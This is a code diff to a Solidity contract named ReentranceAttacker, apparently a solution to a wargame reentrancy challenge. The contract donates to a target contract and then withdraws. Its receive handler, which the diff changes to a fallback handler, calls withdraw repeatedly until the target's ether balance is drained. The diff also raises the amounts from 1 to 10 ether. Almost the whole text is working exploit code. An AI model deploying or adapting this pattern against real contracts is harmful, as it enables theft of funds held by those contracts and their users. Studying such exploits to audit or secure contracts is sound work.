@@ -8,21 +8,21 @@ interface IReentrance {
 }
 
 contract ReentranceAttacker {
-    IReentrance public reentrance;
+    IReentrance private reentrance;
 
     constructor(address _reentrance) {
         reentrance = IReentrance(_reentrance);
     }
 
     function attack() external payable returns (bool) {
-        reentrance.donate{value: 1 ether}(address(this));
-        reentrance.withdraw(1 ether);
+        reentrance.donate{value: 10 ether}(address(this));
+        reentrance.withdraw(10 ether);
         return true;
     }
 
-    receive() external payable {
-        if (address(reentrance).balance >= 1 ether) {
-            reentrance.withdraw(1 ether);
+    fallback() external payable {
+        if (address(reentrance).balance >= 10 ether) {
+            reentrance.withdraw(10 ether);
         } else if (address(reentrance).balance > 0) {
             reentrance.withdraw(address(reentrance).balance);
         }
